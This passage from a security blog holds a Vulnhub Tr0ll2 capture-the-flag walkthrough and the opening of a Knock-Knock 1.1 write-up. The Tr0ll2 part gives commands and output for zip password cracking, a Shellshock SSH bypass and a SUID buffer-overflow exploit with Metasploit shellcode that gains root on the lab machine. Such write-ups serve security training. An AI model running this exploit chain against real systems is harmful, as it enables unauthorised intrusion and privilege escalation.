<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/tr0ll2# wget -i uris_to_check.txt 
</span><span class='line'>--2015-06-23 06:19:05--  http://10.10.10.141/noob/cat_the_troll.jpg
</span><span class='line'>Connecting to 10.10.10.141:80... connected.
</span><span class='line'>HTTP request sent, awaiting response... 200 OK
</span><span class='line'>Length: 15831 (15K) [image/jpeg]
</span><span class='line'>Saving to: `cat_the_troll.jpg'
</span><span class='line'>
</span><span class='line'>100%[====================================================================================================================>] 15,831      --.-K/s   in 0s      
</span><span class='line'>
</span><span class='line'>2015-06-23 06:19:05 (169 MB/s) - `cat_the_troll.jpg' saved [15831/15831]
</span><span class='line'>
</span><span class='line'>--2015-06-23 06:19:05--  http://10.10.10.141/keep_trying/cat_the_troll.jpg
</span><span class='line'>Reusing existing connection to 10.10.10.141:80.
</span><span class='line'>HTTP request sent, awaiting response... 200 OK
</span><span class='line'>Length: 15831 (15K) [image/jpeg]
</span><span class='line'>Saving to: `cat_the_troll.jpg.1'
</span><span class='line'>
</span><span class='line'>100%[====================================================================================================================>] 15,831      --.-K/s   in 0s      
</span><span class='line'>
</span><span class='line'>2015-06-23 06:19:05 (89.2 MB/s) - `cat_the_troll.jpg.1' saved [15831/15831]
</span><span class='line'>
</span><span class='line'>--2015-06-23 06:19:05--  http://10.10.10.141/dont_bother/cat_the_troll.jpg
</span><span class='line'>Reusing existing connection to 10.10.10.141:80.
</span><span class='line'>HTTP request sent, awaiting response... 200 OK
</span><span class='line'>Length: 15873 (16K) [image/jpeg]
</span><span class='line'>Saving to: `cat_the_troll.jpg.2'
</span><span class='line'>
</span><span class='line'>100%[====================================================================================================================>] 15,873      --.-K/s   in 0s      
</span><span class='line'>
</span><span class='line'>2015-06-23 06:19:05 (175 MB/s) - `cat_the_troll.jpg.2' saved [15873/15873]
</span><span class='line'>
</span><span class='line'>--2015-06-23 06:19:05--  http://10.10.10.141/ok_this_is_it/cat_the_troll.jpg
</span><span class='line'>Reusing existing connection to 10.10.10.141:80.
</span><span class='line'>HTTP request sent, awaiting response... 200 OK
</span><span class='line'>Length: 15831 (15K) [image/jpeg]
</span><span class='line'>Saving to: `cat_the_troll.jpg.3'
</span><span class='line'>
</span><span class='line'>100%[====================================================================================================================>] 15,831      --.-K/s   in 0s      
</span><span class='line'>
</span><span class='line'>2015-06-23 06:19:05 (36.5 MB/s) - `cat_the_troll.jpg.3' saved [15831/15831]
</span><span class='line'>
</span><span class='line'>FINISHED --2015-06-23 06:19:05--
</span><span class='line'>Total wall clock time: 0.02s
</span><span class='line'>Downloaded: 4 files, 62K in 0.001s (79.6 MB/s)
</span><span class='line'>root@kali:~/tr0ll2# ls -alh
</span><span class='line'>total 84K
</span><span class='line'>drwxr-xr-x  2 root root 4.0K Jun 23 06:19 .
</span><span class='line'>drwxr-xr-x 39 root root 4.0K Jun 23 04:58 ..
</span><span class='line'>-rw-r--r--  1 root root  16K Oct  4  2014 cat_the_troll.jpg
</span><span class='line'>-rw-r--r--  1 root root  16K Oct  4  2014 cat_the_troll.jpg.1
</span><span class='line'>-rw-r--r--  1 root root  16K Oct  4  2014 cat_the_troll.jpg.2
</span><span class='line'>-rw-r--r--  1 root root  16K Oct  4  2014 cat_the_troll.jpg.3
</span><span class='line'>-rwxr-xr-x  1 root root  927 Jun 23 06:18 robot_check.py
</span><span class='line'>-rw-r--r--  1 root root  323 Jun 23 05:10 robots.txt
</span><span class='line'>-rw-r--r--  1 root root  195 Jun 23 06:18 uris_to_check.txt</span></code></pre></td></tr></table></div></figure>


<p>Next I use <code>strings</code> to check each downloaded picture to find hidden information.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/tr0ll2# strings cat_the_troll.jpg.2
</span><span class='line'>JFIF
</span><span class='line'>#3-652-108?QE8&lt;M=01F`GMTV[\[7DcjcXjQY[W
</span><span class='line'>)W:1:WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
</span><span class='line'>"aq2
</span><span class='line'>... ... truncated ... ...
</span><span class='line'>]=%em;
</span><span class='line'>lj\p
</span><span class='line'>*/ p?E$
</span><span class='line'>Look Deep within y0ur_self for the answer</span></code></pre></td></tr></table></div></figure>


<p><code>y0ur_self</code> looks like another hidden directory on the server.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/Tr0ll2/6.png"></p>

<p>Found <code>answer.txt</code> file which the content looks like encoded by base64. Then I decoded and save to file <code>answer2.txt</code>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/tr0ll2# cat answer.txt | base64 --decode > answer2.txt</span></code></pre></td></tr></table></div></figure>


<p>This file is more like a dictionary file and will be useful later.</p>

<h3>FTP &amp; ZIP Crack</h3>

<p>Now let&rsquo;s move to FTP service.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# ftp 10.10.10.141
</span><span class='line'>Connected to 10.10.10.141.
</span><span class='line'>220 Welcome to Tr0ll FTP... Only noobs stay for a while...
</span><span class='line'>Name (10.10.10.141:root): anonymous
</span><span class='line'>331 Please specify the password.
</span><span class='line'>Password:
</span><span class='line'>530 Login incorrect.
</span><span class='line'>Login failed.
</span><span class='line'>ftp> bye
</span><span class='line'>221 Goodbye.</span></code></pre></td></tr></table></div></figure>


<p>I firstly tried <code>anonymous</code> user to login but failed. After checking the MOTD message and used <code>Tr0ll / Tr0ll</code> as login credential, I logged in successfully.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# ftp 10.10.10.141
</span><span class='line'>Connected to 10.10.10.141.
</span><span class='line'>220 Welcome to Tr0ll FTP... Only noobs stay for a while...
</span><span class='line'>Name (10.10.10.141:root): Tr0ll
</span><span class='line'>331 Please specify the password.
</span><span class='line'>Password:
</span><span class='line'>230 Login successful.
</span><span class='line'>Remote system type is UNIX.
</span><span class='line'>Using binary mode to transfer files.
</span><span class='line'>ftp> ls
</span><span class='line'>200 PORT command successful. Consider using PASV.
</span><span class='line'>150 Here comes the directory listing.
</span><span class='line'>-rw-r--r--    1 0        0            1474 Oct 04  2014 lmao.zip
</span><span class='line'>226 Directory send OK.
</span><span class='line'>ftp> get lmao.zip
</span><span class='line'>local: lmao.zip remote: lmao.zip
</span><span class='line'>200 PORT command successful. Consider using PASV.
</span><span class='line'>150 Opening BINARY mode data connection for lmao.zip (1474 bytes).
</span><span class='line'>226 Transfer complete.
</span><span class='line'>1474 bytes received in 0.00 secs (5272.7 kB/s)
</span><span class='line'>ftp> bye
</span><span class='line'>221 Goodbye.</span></code></pre></td></tr></table></div></figure>


<p>Here I found a zip file. After I downloaded it and trying to unzip the lmao.zip, it was asking for password&hellip;</p>

<p>Next I try to crack the zip password with the dictionary file found before.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/tr0ll2# fcrackzip -v -D -u -p ~/tr0ll2/answer2.txt lmao.zip 
</span><span class='line'>found file 'noob', (size cp/uc   1300/  1679, flags 9, chk 1005)
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>PASSWORD FOUND!!!!: pw == ItCantReallyBeThisEasyRightLOL</span></code></pre></td></tr></table></div></figure>


<p>fcrackzip will found the password in seconds! Now I get in the lmao directory and found noob&rsquo;s SSH key file.</p>

<h3>SSH &amp; Shellshock</h3>

<p>Firstly, I tried to SSH login with noob&rsquo;s key file directly but failed. It looks like there is something command run forced.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/tr0ll2/lmao# ssh -i noob noob@10.10.10.141
</span><span class='line'>The authenticity of host '10.10.10.141 (10.10.10.141)' can't be established.
</span><span class='line'>ECDSA key fingerprint is 91:b8:6a:45:be:41:fd:c8:14:b5:02:a0:66:7c:8c:96.
</span><span class='line'>Are you sure you want to continue connecting (yes/no)? yes
</span><span class='line'>Warning: Permanently added '10.10.10.141' (ECDSA) to the list of known hosts.
</span><span class='line'>TRY HARDER LOL!
</span><span class='line'>Connection to 10.10.10.141 closed.</span></code></pre></td></tr></table></div></figure>


<p>By searching in google, I found <em>shellshock</em> bug will help to bypass this and make commands execute. For more details about how to exploit SSH via exploiting <em>shellshock</em> vulnerability, please check: <a href="http://unix.stackexchange.com/questions/157477/how-can-shellshock-be-exploited-over-ssh">here</a> and <a href="http://bloggars-online.blogspot.ca/2014/10/bash-shellshock-ssh-exploit.html">here</a></p>

<p>So I tried the following command and it works!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/tr0ll2/lmao# ssh -i noob noob@10.10.10.141 '() { :;}; /bin/bash'
</span><span class='line'>id
</span><span class='line'>uid=1002(noob) gid=1002(noob) groups=1002(noob)
</span><span class='line'>python -c "import pty; pty.spawn('/bin/bash')"
</span><span class='line'>noob@Tr0ll2:~$ id
</span><span class='line'>id
</span><span class='line'>uid=1002(noob) gid=1002(noob) groups=1002(noob)
</span><span class='line'>noob@Tr0ll2:~$ pwd
</span><span class='line'>pwd
</span><span class='line'>/home/noob</span></code></pre></td></tr></table></div></figure>


<p>Now I have already broken into the shell.</p>

<p>By poking around in the file system, I found three &lsquo;door&rsquo; files under <code>/nothing_to_see_here/choose_wisely/</code>. There is <code>r00t</code> file in each door folder and they will change every couple of minutes.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>noob@Tr0ll2:/nothing_to_see_here/choose_wisely$ ls -al *
</span><span class='line'>ls -al *
</span><span class='line'>door1:
</span><span class='line'>total 16
</span><span class='line'>drwsr-xr-x 2 root root 4096 Oct  4  2014 .
</span><span class='line'>drwsr-xr-x 5 root root 4096 Oct  4  2014 ..
</span><span class='line'>-rwsr-xr-x 1 root root 7271 Oct  4  2014 r00t
</span><span class='line'>
</span><span class='line'>door2:
</span><span class='line'>total 20
</span><span class='line'>drwsr-xr-x 2 root root 4096 Oct  5  2014 .
</span><span class='line'>drwsr-xr-x 5 root root 4096 Oct  4  2014 ..
</span><span class='line'>-rwsr-xr-x 1 root root 8401 Oct  5  2014 r00t
</span><span class='line'>
</span><span class='line'>door3:
</span><span class='line'>total 16
</span><span class='line'>drwsr-xr-x 2 root root 4096 Oct  5  2014 .
</span><span class='line'>drwsr-xr-x 5 root root 4096 Oct  4  2014 ..
</span><span class='line'>-rwsr-xr-x 1 root root 7273 Oct  5  2014 r00t</span></code></pre></td></tr></table></div></figure>


<p>After several trial and error, I found the <code>r00t</code> file with biggest size is the target which is vulnerable to buffer overflow.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1$ ./r00t $(python -c 'print "A" * 500')
</span><span class='line'>&lt;_here/choose_wisely/door1$ ./r00t $(python -c 'print "A" * 500')            
</span><span class='line'>Segmentation fault</span></code></pre></td></tr></table></div></figure>


<p>Aha, <code>Segmentation fault</code> looks good so far. Then I upload <code>checksec.sh</code> script to check protections.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1$ ./checksec.sh --file r00t 
</span><span class='line'>RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
</span><span class='line'>Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   r00t</span></code></pre></td></tr></table></div></figure>


<p>Great, nearly no protection. Now it&rsquo;s time to move on to find and overflow the EIP.</p>

<p>Firstly, I use <code>pattern_create.rb</code> to generate 500 unique strings:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/tr0ll2# /usr/share/metasploit-framework/tools/pattern_create.rb 500
</span><span class='line'>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq</span></code></pre></td></tr></table></div></figure>


<p>Then use <code>gdb</code> on target machine to track the value of EIP when overflow happened.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1$ gdb -q ./r00t
</span><span class='line'>gdb -q ./r00t
</span><span class='line'>Reading symbols from /nothing_to_see_here/choose_wisely/door1/r00t...done.
</span><span class='line'>(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq
</span><span class='line'>&lt;7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq                  
</span><span class='line'>Starting program: /nothing_to_see_here/choose_wisely/door1/r00t Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq
</span><span class='line'>
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'>0x6a413969 in ?? ()
</span><span class='line'>(gdb) i r esp
</span><span class='line'>i r esp
</span><span class='line'>esp            0xbffffab0 0xbffffab0
</span><span class='line'>(gdb)</span></code></pre></td></tr></table></div></figure>


<p><code>0x6a413969</code> is the pattern, and I use <code>pattern_offset.rb</code> to get the offset is <font color="red">268</font>. Also, I got the value in ESP is <code>0xbffffab0</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/tr0ll2# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x6a413969
</span><span class='line'>[*] Exact match at offset 268</span></code></pre></td></tr></table></div></figure>


<p>Then I use metasploit to generate a shellcode to run <code>/bin/sh</code>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf payload(exec) > generate -b '\x00\x0a\x0d'
</span><span class='line'># linux/x86/exec - 70 bytes
</span><span class='line'># http://www.metasploit.com
</span><span class='line'># Encoder: x86/shikata_ga_nai
</span><span class='line'># VERBOSE=false, PrependFork=false, PrependSetresuid=false, 
</span><span class='line'># PrependSetreuid=false, PrependSetuid=false, 
</span><span class='line'># PrependSetresgid=false, PrependSetregid=false, 
</span><span class='line'># PrependSetgid=false, PrependChrootBreak=false, 
</span><span class='line'># AppendExit=false, CMD=/bin/sh
</span><span class='line'>buf = 
</span><span class='line'>"\xba\xa0\x7b\x18\x95\xdb\xcd\xd9\x74\x24\xf4\x58\x33\xc9" +
</span><span class='line'>"\xb1\x0b\x31\x50\x15\x83\xe8\xfc\x03\x50\x11\xe2\x55\x11" +
</span><span class='line'>"\x13\xcd\x0c\xb4\x45\x85\x03\x5a\x03\xb2\x33\xb3\x60\x55" +
</span><span class='line'>"\xc3\xa3\xa9\xc7\xaa\x5d\x3f\xe4\x7e\x4a\x37\xeb\x7e\x8a" +
</span><span class='line'>"\x67\x89\x17\xe4\x58\x3e\x8f\xf8\xf1\x93\xc6\x18\x30\x93"
</span><span class='line'>msf payload(exec) ></span></code></pre></td></tr></table></div></figure>


<p>Next, construct the payload and exploit the <code>r00t</code> file to get ROOT on the target!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t $(python -c "print 'A' * 268 + '\x80\xfb\xff\xbf' + '\x90' * 16 + '\xba\xa0\x7b\x18\x95\xdb\xcd\xd9\x74\x24\xf4\x58\x33\xc9\xb1\x0b\x31\x50\x15\x83\xe8\xfc\x03\x50\x11\xe2\x55\x11\x13\xcd\x0c\xb4\x45\x85\x03\x5a\x03\xb2\x33\xb3\x60\x55\xc3\xa3\xa9\xc7\xaa\x5d\x3f\xe4\x7e\x4a\x37\xeb\x7e\x8a\x67\x89\x17\xe4\x58\x3e\x8f\xf8\xf1\x93\xc6\x18\x30\x93'")
</span><span class='line'>&lt;7\xeb\x7e\x8a\x67\x89\x17\xe4\x58\x3e\x8f\xf8\xf1\x93\xc6\x18\x30\x93'")    
</span><span class='line'># id
</span><span class='line'>id
</span><span class='line'>uid=1002(noob) gid=1002(noob) euid=0(root) groups=0(root),1002(noob)</span></code></pre></td></tr></table></div></figure>


<p>And then take the FLAG down!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># cd /root
</span><span class='line'>cd /root
</span><span class='line'># ls -al
</span><span class='line'>ls -al
</span><span class='line'>total 80
</span><span class='line'>drwx------ 11 root   root   4096 Oct 14  2014 .
</span><span class='line'>drwxr-xr-x 23 root   root   4096 Oct  5  2014 ..
</span><span class='line'>-rw-------  1 root   root     67 Oct 14  2014 .bash_history
</span><span class='line'>-rw-r--r--  1 root   root   3106 Apr 19  2012 .bashrc
</span><span class='line'>-rw-r--r--  1 root   root    140 Apr 19  2012 .profile
</span><span class='line'>-rw-r--r--  1 root   root     66 Oct  5  2014 .selected_editor
</span><span class='line'>drwx------  2 root   root   4096 Oct  4  2014 .ssh
</span><span class='line'>drwxr-xr-x  2 root   root   4096 Oct  5  2014 .vim
</span><span class='line'>-rw-------  1 root   root   4259 Oct 14  2014 .viminfo
</span><span class='line'>-rw-r--r--  1 root   root     68 Oct  6  2014 Proof.txt
</span><span class='line'>drwxr-xr-x  5 root   root   4096 Oct  4  2014 core1
</span><span class='line'>drwxr-xr-x  5 root   root   4096 Oct  4  2014 core2
</span><span class='line'>drwxr-xr-x  5 root   root   4096 Oct  4  2014 core3
</span><span class='line'>drwxr-xr-x  5 root   root   4096 Oct  4  2014 core4
</span><span class='line'>drwxr-xr-x  2 root   root   4096 Oct  5  2014 goal
</span><span class='line'>drwxr-xr-x  2 root   root   4096 Oct  6  2014 hardmode
</span><span class='line'>-rw-r--r--  1 maleus maleus 1474 Oct  4  2014 lmao.zip
</span><span class='line'>-rw-r--r--  1 root   root    828 Oct  4  2014 ran_dir.py
</span><span class='line'>drwxr-xr-x  2 root   root   4096 Oct  6  2014 reboot
</span><span class='line'># cat Proof.txt
</span><span class='line'>cat Proof.txt
</span><span class='line'>You win this time young Jedi...
</span><span class='line'>
</span><span class='line'>a70354f0258dcc00292c72aab3c8b1e4  
</span><span class='line'>#</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[Vulnhub]Knock-Knock: 1.1]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/06/21/vulnhub-knock-knock-1-dot-1/"/>
    <updated>2015-06-21T04:49:54-04:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/06/21/vulnhub-knock-knock-1-dot-1</id>
    <content type="html"><![CDATA[<p>&ldquo;Pretty much thought of a pretty neat idea I hadn&rsquo;t seen done before with a VM, and I wanted to turn it into reality!
Your job is to escalate to root, and find the flag.
Since I&rsquo;ve gotten a few PM&rsquo;s, remember: There is a difference between "Port Unreachable&rdquo; and &ldquo;Host Unreachable&rdquo;. DHCP is not broken ;)
Gotta give a huge shoutout to c0ne for helping to creating the binary challenge, and rasta_mouse and recrudesce for testing :)
Also, gotta thank barrebas who was able to find a way to make things easier&hellip; but of course that is fixed with this update! ;)&ldquo; &ndash; <font color="green"><em>zer0w1re</em></font></p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/knock-knock-11,105/">here</a>.</p>

<!-- more -->


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali Linux (<em>10.10.10.131/24</em>)</p>

<p>Target: TopHatSec: Freshly (<em>10.10.10.140/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<ul>
<li>Port knocking brute-force to open the hidden ports</li>
<li>Secret information hidden in picture</li>
<li>Buffer Overflow analysis and exploit</li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [<font color="FF8000">Net Discover</font>]</li>
<li>Port scanned the target to discover the running services and open ports [<font color="FF8000">nmap</font>]</li>
<li>Analysis and write script to brute force port knocking</li>
<li>Port scanned again to dicover the real open ports [<font color="FF8000">nmap</font>]</li>
<li>Web application vulnerability scanned to discover any web vulnerability [<font color="FF8000">nikto</font>]</li>
<li>Web information gathering and interacting with the web server [<font color="FF8000">firefox</font>]</li>
<li>Download picture and reveal the hidden information</li>
<li>Crack the cipher text to get login creditional in plain text [<font color="FF8000">Caesar shift with ROT 13</font>]</li>
<li>Login SSH with cracked login creditional</li>
<li>Look around and found suspicious program with SUID bit set</li>
<li>Analysis and work out PoC to exploit BoF vulnerability in the target program to get ROOT</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://nixgeneration.com/~jaime/netdiscover/">netdiscover</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="https://cirt.net/Nikto2">nikto</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using netdiscover as routine to detect the target&rsquo;s IP address (10.10.10.140 in this case).</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/knock-knock/1.png"></p>

